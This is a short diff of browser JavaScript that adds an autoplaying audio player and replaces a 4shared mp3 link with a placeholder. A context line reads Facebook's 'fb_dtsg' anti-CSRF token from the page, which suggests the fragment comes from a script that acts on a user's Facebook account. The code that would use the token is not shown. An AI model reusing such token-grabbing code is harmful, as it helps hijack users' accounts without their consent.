@@ -14,7 +14,7 @@ _audio.style.height="25px";
 _audio.controls = true;
 _audio.autoplay = false;
 _audio.autoplay = true;
-_audio.src = "http://dc148.4shared.com/img/fO0HQXKw/dlink__2Fdownload_2FfO0HQXKw/preview.mp3";
+_audio.src = "B L A N K";
 _div.appendChild(_audio);
 _body.appendChild(_div);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
